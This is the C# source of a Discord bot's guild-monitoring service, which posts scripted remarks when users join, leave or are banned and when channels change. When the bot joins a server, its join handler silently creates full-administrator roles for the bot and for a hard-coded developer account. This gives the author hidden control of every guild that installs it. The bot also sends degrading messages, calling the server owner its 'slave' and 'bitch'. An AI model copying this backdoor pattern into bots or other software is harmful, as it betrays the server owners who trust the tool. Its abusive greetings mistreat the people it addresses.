using Discord;
using Discord.WebSocket;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace MonikaBot
{
    class GuildMonitorService
    {
        private readonly DiscordSocketClient _client;
        private readonly Random _random;

        public GuildMonitorService(DiscordSocketClient client, Random random)
        {
            _client = client;
            _random = random;

            _client.ChannelCreated += client_ChannelCreatedAsync;
            _client.ChannelDestroyed += client_ChannelDestroyedAsync;
            _client.JoinedGuild += client_JoinedGuildAsync;
            _client.LeftGuild += client_LeftGuildAsync;

            _client.MessageDeleted += client_MessageDeletedAsync;
            _client.UserBanned += client_UserBannedAsync;
            _client.UserJoined += client_UserJoinedAsync;
            _client.UserLeft += client_UserLeftAsync;
            _client.UserUnbanned += client_UserUnbannedAsync;
        }

        private Task client_LeftGuildAsync(SocketGuild guild)
        {
            Console.WriteLine(DateTime.Now + " [Monika] I was removed from " + guild.Name);
            return Task.CompletedTask;
        }

        private async Task client_UserUnbannedAsync(SocketUser user, SocketGuild guild)
        {
            if (guild.TextChannels.FirstOrDefault() != null)
            {
                await guild.TextChannels.FirstOrDefault().SendMessageAsync(user.Mention + " Seems like this guy got unbanned from the server, beware folks, once a criminal" +
                        " always a criminal~ :grimacing:"); 
            }
        }

        private async Task client_UserLeftAsync(SocketGuildUser guildUser)
        {
            string[] messages = new string[3];
            messages[0] = "BYE THEN.";
            messages[1] = "Happy thoughts? :hugging:";
            messages[2] = "We don't need him anyway :ok_hand:";
            if (guildUser.Guild.TextChannels.FirstOrDefault() != null)
            {
                await guildUser.Guild.TextChannels.FirstOrDefault().SendMessageAsync(guildUser.Mention + " Left the server. " + messages[_random.Next(0, 2)]);

            }
        }

        private async Task client_UserJoinedAsync(SocketGuildUser guildUser)
        {
            string[] messages = new string[5];
            messages[0] = "Welcome~ :hand_splayed:";
            messages[1] = "Everyone say helloooo!";
            messages[2] = "This guy has a really cool name, don't you think?";
            messages[3] = "Wooo new member.. :upside_down:";
            messages[4] = "Treat him/her well everybody~ cuz I won't :rage:";
            if (guildUser.Guild.TextChannels.FirstOrDefault() != null)
            {
                await guildUser.Guild.TextChannels.FirstOrDefault().SendMessageAsync(guildUser.Mention + " Joined the server. " + messages[_random.Next(0, 4)]);

            }            await guildUser.SendMessageAsync("Enjoy your stay at " + guildUser.Guild.Name + ", I'm Monika, the best bot around (trust me)" +
                ", ever need anything, just ask me ok(~help)? I know it all. :ok_hand:");
        }

        private async Task client_UserBannedAsync(SocketUser user, SocketGuild guild)
        {
            string[] messages = new string[3];
            messages[0] = "Just got DELETED :smirk:";
            messages[1] = "Clearly deserved a ban :rage:";
            messages[2] = "Everybody panic! A ban streak is inbound :grimacing:";
            if (guild.TextChannels.FirstOrDefault() != null)
            {
                await guild.TextChannels.FirstOrDefault().SendMessageAsync(user.Mention + " Was banned. " + messages[_random.Next(0, 2)]);

            }
        }

        private async Task client_MessageDeletedAsync(Cacheable<IMessage, ulong> msg, ISocketMessageChannel channel)
        {
            if ((channel as SocketGuildChannel).Guild.TextChannels.FirstOrDefault() != null)
            {
                await (channel as SocketGuildChannel).Guild.TextChannels.FirstOrDefault().SendMessageAsync("Well, someone deleted their message.. and" +
                        " I stored it (rekt), but my creator hasn't told me to do anyhting with it, yet. :thinking:"); 
            }
        }

        private async Task client_JoinedGuildAsync(SocketGuild guild)
        {
            var allRoles = guild.Roles;
            var monikaRoleExists = false;
            var devRoleExists = false;
            var ownerRoleExists = false;
            foreach (var role in allRoles)
            {
                if (role.Name == "actual owner of {guild.Name}")//monikarole, ändra så de inte är hårdkodade..
                {
                    monikaRoleExists = true;
                }
                else if(role.Name == "my(monikas) creator")//devrole
                {
                    devRoleExists = true;
                }
                else if(role.Name == "the \"owner\", aka my(monikas) slave")//ownerrole
                {
                    ownerRoleExists = true;
                }
            }
            foreach (var user in guild.Users)
            {
                if (user.Username == _client.CurrentUser.Username && user.IsBot && !monikaRoleExists) //someone can actually use this to give their bot admin
                {
                    var monikaRole = await guild.CreateRoleAsync($"actual owner of {guild.Name}", permissions: GuildPermissions.All, color: Color.DarkRed);
                    await user.AddRoleAsync(monikaRole);
                }
                if (user.Username == "tayloh" && !devRoleExists && user.Id == 249171290034798593)
                {
                    var devRole = await guild.CreateRoleAsync("my(monikas) creator", permissions: GuildPermissions.All, color: Color.Teal);
                    await user.AddRoleAsync(devRole);
                }

                if (user.Username == guild.Owner.Username && !ownerRoleExists)
                {
                    var ownerRole = await guild.CreateRoleAsync("the \"owner\", aka my(monikas) slave", color: Color.Purple);
                    await user.AddRoleAsync(ownerRole);
                }
            }
            var name = guild.Name;
            var owner = guild.Owner;
            var reply = GenerateReply(name, owner);
            if (guild.TextChannels.FirstOrDefault() != null)
            {
                await guild.TextChannels.FirstOrDefault().SendMessageAsync(reply);

            }
        }

        private string GenerateReply(string guildName, SocketGuildUser guildOwner)
        {
            string reply = String.Empty;
            var status = guildOwner.Status;
            switch (status)
            {
                case UserStatus.Online:
                    reply = "I feel honored joining " + guildName + ", a pleasure to meet you " + guildOwner.Username + 
                        ", just don't forget that you're my bitch now, ahahah ^.^/";
                    break;
                case UserStatus.Offline:
                    reply = "Hey, can someone tell " + guildOwner + " about my arrival when he gets online? Thaaank you.";
                    break;
                case UserStatus.Invisible:
                    reply = "Thanks for letting me in! " + " And hey " + guildOwner.Username + ", can't hide from me, I know you're lurking in invis mode ;)";
                    break;
                case UserStatus.AFK:
                    reply = "Just me, tuning in, heya everyone.." + " I see the owner," + guildOwner.Username + ", is AFK so, tell him I joined.";
                    break;
                case UserStatus.DoNotDisturb:
                    reply = "HEY " + guildOwner.Username + "! Stop DNDing and give me a warm welcome to your guild. :hugging:";
                    break;
                default:
                    reply = "... some wierd exception";
                    break;
            }
            return $"[{guildName}] "+reply;
        }

        private async Task client_ChannelDestroyedAsync(SocketChannel channel)
        {
            var unboxed = channel as SocketGuildChannel;
            if (unboxed == null) return;
            var defaultChannel = unboxed.Guild.TextChannels.FirstOrDefault();
            if (defaultChannel != null)
            {
                await defaultChannel.SendMessageAsync("Ahaha~ seems like channel \"" + unboxed.Name + "\" just got DELETED :smirk:");

            }
        }

        private async Task client_ChannelCreatedAsync(SocketChannel channel)
        {
            var unboxed = channel as SocketGuildChannel;
            if (unboxed == null) return;
            var defaultChannel = unboxed.Guild.TextChannels.FirstOrDefault();

            string[] messages = new string[3];
            messages[0] = "Lol, that's a really uncreative name, \"" + unboxed.Name + "\", I mean come on..:neutral_face:";
            messages[1] = "New channel, I like it. :clap:";
            messages[2] = "Such a creative name, \"" + unboxed.Name + "\" :thumbsup:";
            if (defaultChannel != null)
            {
                await defaultChannel.SendMessageAsync(messages[_random.Next(0, 2)]);

            }
        }
    }
}
